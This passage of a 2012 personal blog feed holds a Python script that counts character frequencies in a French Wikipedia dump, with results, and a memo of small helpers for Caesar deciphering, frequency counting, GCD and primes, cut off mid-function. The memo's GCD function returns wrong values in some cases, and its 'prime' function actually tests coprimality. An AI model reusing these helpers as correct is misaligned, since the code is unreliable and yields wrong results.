<p style="padding-left: 60px;">Start the process in a virtual machine and analyse his behavior with tools like <strong>processmonitor</strong>, <strong>regshot</strong> or <strong>sysanalyzer</strong>.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Wikipedia frequency analysis]]></title>
    <link href="http://www.robindavid.fr/blog/2012/06/16/wikipedia-frequency-analysis/"/>
    <updated>2012-06-16T00:00:00+00:00</updated>
    <id>http://www.robindavid.fr/blog/2012/06/16/wikipedia-frequency-analysis</id>
    <content type="html"><![CDATA[<h2>Introduction</h2>

<p>The wish to do a frequency analysis of wikipedia came from the lack of a good frequency table for french character that included every characters(space, tab, LF etc).
In order to do it I needed a strong base, and I knew it was possible to download the entire content of Wikipedia that&rsquo;s why I have decided to take it as basis.</p>

<p>Dumps can be downloaded on <a href="http://dumps.wikimedia.org/frwiki/latest/">wikimedia</a>. The one I took for this test is the release of the 18th of February 2012 and weigh uncompressed 12.5 GB.</p>

<p>The code used is quite simple, the only thing I had to deal with was the xml and the wiki syntax. Indeed I wanted only articles content and not all xml tags which would have disguised results.</p>

<p>Thats why I filtered only the text contained into &#8217;&lt;text xml:space=&ldquo;preserve&rdquo;&gt;&lsquo; and &rsquo;&lt;/text&gt;&lsquo; which are the two markers for the begin and the end of an article. Moreover within an article I do some clean up that&rsquo;s why I remove all Wiki syntax tags(in a dirty way) otherwise it would also disguise results (and &rsquo;[&lsquo; would be for instance well ranked whereas it should not).</p>

<p><em>Note: I have written this script in python 3 that support unicode crucial here.</em></p>

<h2>Script</h2>

<figure class='code'><figcaption><span>Frequency analysis script</span><a href='https://github.com/RobinDavid/Python-programs/blob/master/wikipedia_frequency_analysis/wiki-analysis.py'>link</a></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python3.2</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">re</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">sys</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">time</span>
</span><span class='line'>
</span><span class='line'><span class="c">#---------- GLOBAL VARS -------</span>
</span><span class='line'><span class="n">lines</span><span class="o">=</span><span class="mi">0</span>
</span><span class='line'><span class="n">articles</span><span class="o">=</span><span class="mi">0</span>
</span><span class='line'><span class="c">#characters=0</span>
</span><span class='line'>
</span><span class='line'><span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="s">&quot;r&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">article</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="n">begin_text</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="s">&#39;&lt;text xml:space=&quot;preserve&quot;&gt;&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">end_text</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="s">&#39;&lt;/text&gt;&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">within_article</span> <span class="o">=</span> <span class="bp">False</span>
</span><span class='line'><span class="n">dictionnary</span> <span class="o">=</span> <span class="p">{}</span>
</span><span class='line'>
</span><span class='line'><span class="n">left_brackets</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="s">&quot;\[\[&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">right_brackets</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="s">&quot;\]\]&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">colon_brackets</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="s">&quot;\[\[\S*:.*\]\]</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">curly_brackets</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="s">&quot;\{\{.*\}\}</span><span class="se">\n</span><span class="s">?&quot;</span><span class="p">)</span>
</span><span class='line'><span class="c">#------------------------------</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">print_temp_stats</span><span class="p">():</span>
</span><span class='line'>    <span class="k">print</span><span class="p">(</span><span class="s">&quot;Lines: &quot;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">lines</span><span class="p">),</span><span class="n">end</span><span class="o">=</span><span class="s">&quot;</span><span class="se">\r</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">clean_line</span><span class="p">(</span><span class="n">l</span><span class="p">):</span>
</span><span class='line'>  <span class="n">line</span> <span class="o">=</span> <span class="n">l</span>
</span><span class='line'>  <span class="n">line</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span><span class="n">colon_brackets</span><span class="p">,</span><span class="s">&#39;&#39;</span><span class="p">,</span><span class="n">line</span><span class="p">)</span>
</span><span class='line'>  <span class="n">line</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span><span class="n">left_brackets</span><span class="p">,</span><span class="s">&#39;&#39;</span><span class="p">,</span><span class="n">line</span><span class="p">)</span>
</span><span class='line'>  <span class="n">line</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span><span class="n">right_brackets</span><span class="p">,</span><span class="s">&#39;&#39;</span><span class="p">,</span><span class="n">line</span><span class="p">)</span>
</span><span class='line'>  <span class="n">line</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span><span class="n">curly_brackets</span><span class="p">,</span><span class="s">&#39;&#39;</span><span class="p">,</span><span class="n">line</span><span class="p">)</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">line</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">processArticle</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
</span><span class='line'>  <span class="c">#global characters</span>
</span><span class='line'>  <span class="k">for</span> <span class="n">elt</span> <span class="ow">in</span> <span class="n">s</span><span class="p">:</span>
</span><span class='line'>    <span class="k">try</span><span class="p">:</span>
</span><span class='line'>      <span class="n">dictionnary</span><span class="p">[</span><span class="n">elt</span><span class="p">]</span> <span class="o">+=</span> <span class="mi">1</span>
</span><span class='line'>    <span class="k">except</span> <span class="ne">KeyError</span><span class="p">:</span> <span class="c">#Faster in execution than doing if dictionnary.get(elt) because triggered once for each new characters but after far faster..</span>
</span><span class='line'>      <span class="n">dictionnary</span><span class="p">[</span><span class="n">elt</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">write_final</span><span class="p">():</span>
</span><span class='line'>  <span class="k">print</span><span class="p">()</span>
</span><span class='line'>  <span class="n">name</span> <span class="o">=</span> <span class="s">&quot;RESULT-&quot;</span><span class="o">+</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">+</span><span class="s">&quot;.txt&quot;</span>
</span><span class='line'>  <span class="n">fout</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">name</span><span class="p">,</span><span class="s">&quot;w&quot;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">l</span> <span class="o">=</span> <span class="nb">sorted</span><span class="p">(</span><span class="n">dictionnary</span><span class="o">.</span><span class="n">items</span><span class="p">(),</span><span class="n">key</span><span class="o">=</span><span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="n">x</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">reverse</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
</span><span class='line'>  <span class="k">for</span> <span class="n">elt</span> <span class="ow">in</span> <span class="n">l</span><span class="p">:</span>
</span><span class='line'>    <span class="n">e</span> <span class="o">=</span> <span class="n">elt</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
</span><span class='line'>    <span class="k">if</span> <span class="n">e</span> <span class="o">==</span> <span class="s">&quot; &quot;</span><span class="p">:</span>
</span><span class='line'>      <span class="n">e</span> <span class="o">=</span> <span class="s">&quot;[SPACE]&quot;</span>
</span><span class='line'>    <span class="k">elif</span> <span class="n">e</span> <span class="o">==</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">:</span>
</span><span class='line'>      <span class="n">e</span> <span class="o">=</span> <span class="s">&quot;[LF]&quot;</span>
</span><span class='line'>    <span class="k">elif</span> <span class="n">e</span> <span class="o">==</span> <span class="s">&quot;</span><span class="se">\t</span><span class="s">&quot;</span><span class="p">:</span>
</span><span class='line'>      <span class="n">e</span> <span class="o">=</span> <span class="s">&quot;[HTAB]&quot;</span>
</span><span class='line'>    <span class="k">elif</span> <span class="n">e</span> <span class="o">==</span> <span class="s">&quot;</span><span class="se">\r</span><span class="s">&quot;</span><span class="p">:</span>
</span><span class='line'>      <span class="n">e</span> <span class="o">=</span> <span class="s">&quot;[CR]&quot;</span>
</span><span class='line'>    <span class="n">s</span> <span class="o">=</span> <span class="n">e</span> <span class="o">+</span> <span class="s">&quot;: &quot;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">elt</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
</span><span class='line'>    <span class="n">fout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">s</span><span class="o">+</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">fout</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>  <span class="k">print</span><span class="p">(</span><span class="s">&quot;Results in: &quot;</span><span class="o">+</span><span class="n">name</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">print_final_stats</span><span class="p">():</span>
</span><span class='line'>  <span class="n">chars</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'>  <span class="k">for</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">dictionnary</span><span class="o">.</span><span class="n">values</span><span class="p">():</span>
</span><span class='line'>    <span class="n">chars</span> <span class="o">+=</span> <span class="n">v</span>
</span><span class='line'>  <span class="k">print</span><span class="p">(</span><span class="s">&quot;Articles: &quot;</span><span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">articles</span><span class="p">)</span> <span class="o">+</span> <span class="s">&quot;</span><span class="se">\t</span><span class="s">Lines: &quot;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">lines</span><span class="p">)</span> <span class="o">+</span> <span class="s">&quot;</span><span class="se">\t</span><span class="s">Number characters: &quot;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">chars</span><span class="p">)</span><span class="o">+</span><span class="s">&quot;</span><span class="se">\t</span><span class="s">Different characters: &quot;</span><span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">dictionnary</span><span class="p">)))</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">&quot;__main__&quot;</span><span class="p">:</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">1</span><span class="p">:</span>
</span><span class='line'>    <span class="k">print</span><span class="p">(</span><span class="s">&quot;Usage: wiki-analysis.py wikipedia-filename&quot;</span><span class="p">)</span>
</span><span class='line'>    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">tdeb</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
</span><span class='line'>      <span class="n">line</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span>
</span><span class='line'>      <span class="k">if</span> <span class="n">line</span> <span class="o">==</span> <span class="s">&quot;&quot;</span><span class="p">:</span>
</span><span class='line'>          <span class="k">break</span><span class="p">;</span>
</span><span class='line'>      <span class="n">lines</span> <span class="o">+=</span> <span class="mi">1</span>
</span><span class='line'>
</span><span class='line'>      <span class="k">if</span> <span class="ow">not</span> <span class="n">within_article</span><span class="p">:</span>
</span><span class='line'>          <span class="k">if</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">begin_text</span><span class="p">,</span><span class="n">line</span><span class="p">):</span>
</span><span class='line'>              <span class="n">within_article</span> <span class="o">=</span> <span class="bp">True</span>
</span><span class='line'>              <span class="n">articles</span> <span class="o">+=</span> <span class="mi">1</span>
</span><span class='line'>              <span class="n">article</span> <span class="o">+=</span> <span class="n">clean_line</span><span class="p">(</span><span class="n">re</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span><span class="n">begin_text</span><span class="p">,</span><span class="s">&quot;&quot;</span><span class="p">,</span><span class="n">line</span><span class="p">))</span>
</span><span class='line'>      <span class="k">else</span><span class="p">:</span> <span class="c">#already in an article</span>
</span><span class='line'>          <span class="k">if</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">end_text</span><span class="p">,</span><span class="n">line</span><span class="p">):</span>
</span><span class='line'>              <span class="n">within_article</span> <span class="o">=</span> <span class="bp">False</span>
</span><span class='line'>              <span class="n">processArticle</span><span class="p">(</span><span class="n">article</span><span class="p">)</span>
</span><span class='line'>              <span class="n">article</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
</span><span class='line'>          <span class="k">else</span><span class="p">:</span>
</span><span class='line'>              <span class="n">article</span> <span class="o">+=</span> <span class="n">clean_line</span><span class="p">(</span><span class="n">line</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>      <span class="n">print_temp_stats</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>  <span class="n">tfin</span><span class="o">=</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">print</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">Execution time: &quot;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">tfin</span><span class="o">-</span><span class="n">tdeb</span><span class="p">)</span> <span class="o">+</span> <span class="s">&quot; secondes&quot;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">print_final_stats</span><span class="p">()</span>
</span><span class='line'>  <span class="n">write_final</span><span class="p">()</span>
</span><span class='line'>  <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<h2>Results</h2>

<p>The execution of my script took aproximately 3 hours and the output is:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">bash</span><span class="err">$</span> <span class="o">./</span><span class="n">wiki</span><span class="o">-</span><span class="n">analysis</span><span class="o">.</span><span class="n">py</span> <span class="n">frwiki</span><span class="o">-</span><span class="n">latest</span><span class="o">-</span><span class="n">pages</span><span class="o">-</span><span class="n">meta</span><span class="o">-</span><span class="n">current</span><span class="o">.</span><span class="n">xml</span>
</span><span class='line'><span class="n">Lines</span><span class="p">:</span> <span class="mi">222669441</span>
</span><span class='line'><span class="n">Execution</span> <span class="n">time</span><span class="p">:</span> <span class="mf">10033.887793064117</span> <span class="n">secondes</span>
</span><span class='line'><span class="n">Articles</span><span class="p">:</span> <span class="mi">3714740</span>       <span class="n">Lines</span><span class="p">:</span> <span class="mi">222669441</span>        <span class="n">Number</span> <span class="n">characters</span><span class="p">:</span> <span class="mi">9217905119</span>   <span class="n">Different</span> <span class="n">characters</span><span class="p">:</span> <span class="mi">27605</span>
</span><span class='line'>
</span><span class='line'><span class="n">Results</span> <span class="ow">in</span><span class="p">:</span> <span class="n">RESULT</span><span class="o">-</span><span class="n">frwiki</span><span class="o">-</span><span class="n">latest</span><span class="o">-</span><span class="n">pages</span><span class="o">-</span><span class="n">meta</span><span class="o">-</span><span class="n">current</span><span class="o">.</span><span class="n">xml</span><span class="o">.</span><span class="n">txt</span>
</span></code></pre></td></tr></table></div></figure>


<p>You can download the output file with the complete table <a href="https://github.com/RobinDavid/Python-programs/blob/master/wikipedia_frequency_analysis/RESULT-frwiki-latest-pages-meta-current.xml.txt">here</a>.</p>

<p><strong>As we could have supposed the space comes in first position with 1329412224 times, followed by &ldquo;e&rdquo; and &ldquo;t&rdquo;. The LF comes in 16th position. As we can see it took almost 3 hours which is quite long for data process (even though it is 12 GB).</strong></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Basic but useful function python Memo]]></title>
    <link href="http://www.robindavid.fr/blog/2012/06/15/useful-basic-function-python-memo/"/>
    <updated>2012-06-15T00:00:00+00:00</updated>
    <id>http://www.robindavid.fr/blog/2012/06/15/useful-basic-function-python-memo</id>
    <content type="html"><![CDATA[<h3>Read file into list</h3>

<p>The function take a file open in read byte mode and return a list of the decimal value of characters.</p>

<figure class='code'><figcaption><span>Put every bytes of a file into a list</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">def</span> <span class="nf">toList</span><span class="p">(</span><span class="n">f</span><span class="p">):</span>
</span><span class='line'>    <span class="n">l</span> <span class="o">=</span> <span class="nb">list</span><span class="p">()</span>
</span><span class='line'>    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
</span><span class='line'>        <span class="n">b</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'>        <span class="k">if</span> <span class="n">b</span> <span class="o">==</span> <span class="s">&#39;&#39;</span><span class="p">:</span>
</span><span class='line'>            <span class="k">break</span>
</span><span class='line'>        <span class="k">else</span><span class="p">:</span>
</span><span class='line'>            <span class="n">l</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">b</span><span class="p">))</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">l</span>
</span></code></pre></td></tr></table></div></figure>


<h3>Count instances of a char in a list</h3>

<p>Return a sorted list ordered descending of every elements and their hits.</p>

<figure class='code'><figcaption><span>Count frequency of bytes</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">def</span> <span class="nf">countFreq</span><span class="p">(</span><span class="n">l</span><span class="p">):</span> <span class="c"># return list with (decimal_char, occ) </span>
</span><span class='line'>    <span class="n">d</span><span class="o">=</span><span class="p">{}</span>
</span><span class='line'>    <span class="k">for</span> <span class="n">elt</span> <span class="ow">in</span> <span class="n">l</span><span class="p">:</span>
</span><span class='line'>        <span class="k">if</span> <span class="n">d</span><span class="o">.</span><span class="n">has_key</span><span class="p">(</span><span class="n">elt</span><span class="p">):</span>
</span><span class='line'>            <span class="n">d</span><span class="p">[</span><span class="n">elt</span><span class="p">]</span> <span class="o">+=</span> <span class="mi">1</span>
</span><span class='line'>        <span class="k">else</span><span class="p">:</span>
</span><span class='line'>            <span class="n">d</span><span class="p">[</span><span class="n">elt</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span>
</span><span class='line'>    <span class="k">return</span> <span class="nb">sorted</span><span class="p">(</span><span class="n">d</span><span class="o">.</span><span class="n">items</span><span class="p">(),</span><span class="n">key</span><span class="o">=</span><span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="n">x</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">reverse</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<h3>Maximum in a dictionnary</h3>

<p>Return the tuple key value of the element which have the highest value (from the list of elements returned in the function above</p>

<figure class='code'><figcaption><span>get max </span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">def</span> <span class="nf">max</span><span class="p">(</span><span class="n">d</span><span class="p">):</span>
</span><span class='line'>  <span class="n">m</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'>  <span class="n">elt</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
</span><span class='line'>  <span class="k">for</span> <span class="n">k</span><span class="p">,</span><span class="n">v</span> <span class="ow">in</span> <span class="n">d</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
</span><span class='line'>      <span class="k">if</span> <span class="n">v</span> <span class="o">&gt;</span> <span class="n">m</span><span class="p">:</span>
</span><span class='line'>          <span class="n">m</span> <span class="o">=</span> <span class="n">v</span>
</span><span class='line'>          <span class="n">elt</span> <span class="o">=</span> <span class="n">k</span>
</span><span class='line'>  <span class="k">return</span> <span class="p">{</span><span class="n">elt</span><span class="p">:</span><span class="n">m</span><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<h3>Caesar decipher</h3>

<p>Decipher the given list with the given shift.</p>

<figure class='code'><figcaption><span>Caesar decipher function</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">def</span> <span class="nf">decipher</span><span class="p">(</span><span class="n">l</span><span class="p">,</span><span class="n">diff</span><span class="p">):</span>
</span><span class='line'>  <span class="n">newl</span> <span class="o">=</span> <span class="nb">list</span><span class="p">()</span>
</span><span class='line'>  <span class="k">for</span> <span class="n">e</span> <span class="ow">in</span> <span class="n">l</span><span class="p">:</span>
</span><span class='line'>      <span class="n">val</span> <span class="o">=</span> <span class="n">e</span> <span class="o">-</span> <span class="n">diff</span>
</span><span class='line'>      <span class="k">if</span> <span class="n">val</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">:</span>
</span><span class='line'>          <span class="n">newl</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="mi">256</span> <span class="o">+</span> <span class="p">(</span><span class="n">val</span> <span class="o">%</span> <span class="o">-</span><span class="mi">256</span><span class="p">))</span>
</span><span class='line'>      <span class="k">else</span><span class="p">:</span>
</span><span class='line'>          <span class="n">newl</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">val</span><span class="p">)</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">newl</span>
</span></code></pre></td></tr></table></div></figure>


<h3>PGCD(GCD)</h3>

<p>Return the PGCD(GCD) of two values given in parameter</p>

<figure class='code'><figcaption><span>compute GCD</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">def</span> <span class="nf">pgcd</span><span class="p">(</span><span class="n">num</span><span class="p">,</span><span class="n">divisor</span><span class="p">,</span><span class="n">remain</span><span class="o">=</span><span class="mi">0</span><span class="p">):</span>
</span><span class='line'>  <span class="n">rem</span> <span class="o">=</span> <span class="n">num</span> <span class="o">%</span> <span class="n">divisor</span>
</span><span class='line'>  <span class="k">if</span> <span class="n">rem</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span><span class='line'>      <span class="k">return</span> <span class="n">remain</span>
</span><span class='line'>  <span class="k">else</span><span class="p">:</span>
</span><span class='line'>      <span class="k">return</span> <span class="n">pgcd</span><span class="p">(</span><span class="n">divisor</span><span class="p">,</span><span class="n">rem</span><span class="p">,</span><span class="n">rem</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<h3>Prime Numbers</h3>

<p>Return a list of all the prime numbers until the number given in parameter.</p>

<figure class='code'><figcaption><span>compute prime numbers </span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">def</span> <span class="nf">getPrimeNb</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
</span><span class='line'>  <span class="n">l</span> <span class="o">=</span><span class="p">[]</span>
</span><span class='line'>  <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span> <span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">x</span><span class="p">):</span>
</span><span class='line'>      <span class="k">if</span> <span class="n">pgcd</span><span class="p">(</span><span class="n">x</span><span class="p">,</span><span class="n">i</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
